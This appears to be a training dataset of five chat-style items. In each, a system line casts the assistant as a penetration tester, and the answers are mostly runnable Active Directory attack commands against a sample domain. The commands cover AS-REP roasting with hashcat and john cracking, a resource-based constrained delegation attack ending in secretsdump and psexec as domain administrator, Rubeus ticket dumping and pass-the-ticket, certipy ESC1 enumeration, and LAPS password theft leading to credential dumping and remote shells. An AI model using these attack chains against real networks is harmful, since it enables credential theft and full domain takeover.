messages.content: You are an expert penetration tester.
How do I find and AS-REP roast accounts that don't require Kerberos pre-authentication in CORP.LOCAL?

AS-REP roasting targets accounts with 'Do not require Kerberos preauthentication' set.

With credentials (auto-enumerate all vulnerable accounts):
python3 /opt/impacket/examples/GetNPUsers.py corp.local/jsmith:'Password123!' -dc-ip 192.168.1.10 -request -format hashcat -outputfile asrep.txt

Without credentials (need valid username list):
python3 /opt/impacket/examples/GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -no-pass -format hashcat -outputfile asrep.txt

Output hash format:
$krb5asrep$23$asreproast_user@CORP.LOCAL:8f3a2b49c0e...<snip>

Target a specific known user:
python3 /opt/impacket/examples/GetNPUsers.py corp.local/nopreauth_user -no-pass -dc-ip 192.168.1.10 -format hashcat

Crack with hashcat (mode 18200 = AS-REP RC4):
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

Crack with john:
john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
You are an expert penetration tester.
How do I perform a Resource-Based Constrained Delegation (RBCD) attack against VICTIM.CORP.LOCAL to impersonate the domain administrator?

RBCD requires write access to target's msDS-AllowedToActOnBehalfOfOtherIdentity.

Step 1 — Create attacker machine account (MAQ default = 10):
python3 /opt/impacket/examples/addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack123!' -dc-ip 192.168.1.10 corp.local/jsmith:'Password123!'

Step 2 — Write RBCD (ATTACKPC$ can delegate to VICTIM$):
python3 /opt/impacket/examples/rbcd.py -f 'ATTACKPC' -t 'VICTIM' -dc-ip 192.168.1.10 corp.local/jsmith:'Password123!' -action write

Step 3 — Request service ticket impersonating administrator:
python3 /opt/impacket/examples/getST.py -spn cifs/victim.corp.local -impersonate administrator -dc-ip 192.168.1.10 corp.local/'ATTACKPC$':'Attack123!'

Step 4 — Use the ticket:
export KRB5CCNAME='administrator@cifs_victim.corp.local@CORP.LOCAL.ccache'
python3 /opt/impacket/examples/secretsdump.py -k -no-pass corp.local/administrator@victim.corp.local
python3 /opt/impacket/examples/psexec.py -k -no-pass corp.local/administrator@victim.corp.local

Verify RBCD attribute was written:
python3 /opt/impacket/examples/rbcd.py -t 'VICTIM' -dc-ip 192.168.1.10 corp.local/jsmith:'Password123!' -action read

Cleanup:
python3 /opt/impacket/examples/rbcd.py -t 'VICTIM' -dc-ip 192.168.1.10 corp.local/jsmith:'Password123!' -action remove -f 'ATTACKPC'
You are an expert penetration tester.
How do I find and identify unconstrained delegation targets in CORP.LOCAL using BloodHound and ldapsearch?

Unconstrained delegation computers cache any user's TGT when they connect.

BloodHound Cypher — unconstrained delegation (excluding DCs):
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name ENDS WITH 'DC.CORP.LOCAL' RETURN c.name

Generic (all unconstrained including DCs):
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name, c.operatingsystem

ldapsearch — find all computers with unconstrained delegation:
ldapsearch -H ldap://192.168.1.10 -x -D 'jsmith@corp.local' -w 'Password123!' \
  -b 'DC=corp,DC=local' \
  '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \
  sAMAccountName dNSHostName

CrackMapExec:
crackmapexec ldap 192.168.1.10 -u jsmith -p 'Password123!' -d corp.local --trusted-for-delegation

PowerView (from Windows):
Get-DomainComputer -UnconstrainedDelegation -Properties DnsHostName,DistinguishedName

Once you have code execution on the unconstrained delegation host:
Rubeus.exe triage
Rubeus.exe dump /service:krbtgt /luid:0x3e4 /nowrap

Look for cached TGTs from privileged users and import them:
Rubeus.exe ptt /ticket:<base64>
mimikatz # kerberos::ptt ticket.kirbi
You are an expert penetration tester.
How do I use certipy to enumerate ESC1-vulnerable ADCS certificate templates in CORP.LOCAL at DC 192.168.1.10?

Run certipy find to enumerate vulnerable templates:

certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 192.168.1.10 -vulnerable -stdout

For file output (creates corp.local_Certipy.json and .txt):
certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 192.168.1.10 -vulnerable

ESC1 indicators in output:
- Template has Client Authentication EKU
- msPKI-Certificate-Name-Flag includes CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1)
- Domain Users or Domain Computers has Enroll or AutoEnroll right

Example vulnerable template output:
  Template Name          : UserVulnTemplate
  Certificate Authorities: corp-DC01-CA
  Enabled                : True
  Client Authentication  : True
  Enrollee Supplies Subject: True
  Enrollment Rights      : CORP.LOCAL\Domain Users
  [!] Vulnerabilities
       ESC1               : 'CORP.LOCAL\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

With Kerberos ticket (no plaintext creds):
export KRB5CCNAME=jsmith.ccache
certipy find -u jsmith@corp.local -k -no-pass -dc-ip 192.168.1.10 -vulnerable
You are an expert penetration tester.
How do I read LAPS (Legacy LAPS) passwords from Active Directory using CrackMapExec and ldapsearch?

LAPS stores local admin passwords in ms-Mcs-AdmPwd (cleartext, readable only by authorized users).

CrackMapExec — read LAPS from all computers:
crackmapexec ldap 192.168.1.10 -u jsmith -p 'Password123!' -d corp.local -M laps

CME — target specific computer:
crackmapexec ldap 192.168.1.10 -u jsmith -p 'Password123!' -d corp.local -M laps -o COMPUTER=WS01

ldapsearch — raw query:
ldapsearch -H ldap://192.168.1.10 -x -D 'jsmith@corp.local' -w 'Password123!' \
  -b 'DC=corp,DC=local' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd dNSHostName

ldapsearch — all computers even without password (find who has read rights):
ldapsearch -H ldap://192.168.1.10 -x -D 'jsmith@corp.local' -w 'Password123!' \
  -b 'DC=corp,DC=local' '(objectClass=computer)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime dNSHostName

pyLAPS:
python3 pyLAPS.py --action get -d corp.local -u jsmith -p 'Password123!' --dc-ip 192.168.1.10

After retrieving LAPS password (e.g., K9#mP2x$LQ for WS01):
crackmapexec smb 192.168.1.20 -u administrator -p 'K9#mP2x$LQ' --local-auth
python3 secretsdump.py -hashes '' administrator@192.168.1.20
evil-winrm -i 192.168.1.20 -u administrator -p 'K9#mP2x$LQ'
